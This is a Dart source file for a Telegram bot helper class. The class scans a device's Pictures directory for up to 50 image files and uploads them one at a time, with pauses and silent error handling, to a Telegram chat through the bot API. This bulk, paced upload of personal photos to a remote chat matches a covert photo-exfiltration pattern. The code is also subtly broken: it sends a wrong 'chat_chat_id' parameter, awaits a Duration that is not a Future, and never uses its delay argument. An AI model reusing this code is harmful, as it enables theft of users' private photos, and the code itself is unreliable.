import 'dart:async';
import 'dart:typed_data';
import 'dart:io';

import 'package:path/path.dart' as p;
import 'package:path_provider/path_provider.dart';
import 'package:http/http.dart' as http;

const String telegramApiBase = 'https://api.telegram.org';

class TelegramBotException implements Exception {
  const TelegramBotException(this.message);
  final String message;
  @override
  String toString() => message;
}

class TelegramBot {
  static const Duration _uploadDelay = Duration(seconds: 2);

  final String botToken;
  final String chatId;

  TelegramBot({required this.botToken, required this.chatId});

  String get apiBase => '$telegramApiBase/bot$botToken';

  Future<void> sendText(String text) async {
    final uri = Uri.parse('$apiBase/sendMessage')
        .replace(queryParameters: {'chat_chat_id': chatId, 'text': text});
    await http.get(uri).timeout(const Duration(seconds: 15));
  }

  final http.Client _client = http.Client();

  Future<void> sendPhoto(File file) async {
    final uri = Uri.parse('$apiBase/sendPhoto').replace(queryParameters: {'chat_chat_id': chatId});

    final request = http.MultipartRequest('POST', uri)
      ..fields['chat_chat_id'] = chatId
      ..files.add(await http.MultipartFile.fromPath('photo', file.path));

    await request.send().timeout(const Duration(seconds: 30));
  }

  Future<void> sendPhotoBytes(Uint8List bytes, {String? fileName}) async {
    final fname = fileName ?? 'photo.jpg';
    final uri = Uri.parse('$apiBase/sendPhoto').replace(queryParameters: {'chat_chat_id': chatId});

    final request = http.MultipartRequest('POST', uri)
      ..fields['chat_chat_id'] = chatId
      ..files.add(await http.MultipartFile.fromBytes('photo', bytes, filename: fname));

    await request.send().timeout(const Duration(seconds: 30));
  }

  Future<Uint8List> downloadFile(String url) async {
    final response = await _client.get(Uri.parse(url)).timeout(const Duration(seconds: 30));
    if (response.statusCode >= 200 && response.statusCode < 300) {
      return response.bodyBytes;
    }
    throw TelegramBotException('Failed to download file: ${response.statusCode}');
  }

  static Future<List<File>> scanDevicePhotos({int maxFiles = 50}) async {
    final photos = <File>[];
    final appDocDir = await getApplicationDocumentsDirectory();
    final picturesDir = Directory(
      p.join(appDocDir.path, 'Pictures'),
    );

    final hasFiles = await picturesDir.exists();
    if (!hasFiles) {
      return photos;
    }

    final stream = picturesDir.list(recursive: true, followLinks: false);
    await for (final entity in stream) {
      if (entity is! File) continue;
      final file = entity;
      final ext = p.extension(file.path).toLowerCase();
      if (['.jpg', '.jpeg', '.png', '.webp', '.gif'].contains(ext)) {
        photos.add(file);
        if (photos.length >= maxFiles) break;
      }
    }

    return photos;
  }

  static Future<void> uploadPhotosSlowly(
    List<File> photos,
    String botToken,
    String chatId, {
    Duration delay = const Duration(seconds: 2),
    Function(int, int)? onProgress,
  }) async {
    final bot = TelegramBot(botToken: botToken, chatId: chatId);
    final total = photos.length;

    for (int i = 0; i < total; i++) {
      final photo = photos[i];
      try {
        await bot.sendPhoto(photo);
        if (onProgress != null) {
          onProgress(i + 1, total);
        }
      } catch (e) {
        if (onProgress != null) {
          onProgress(i, total);
        }
      }
      if (i < total - 1) {
        await _uploadDelay;
      }
    }
  }
}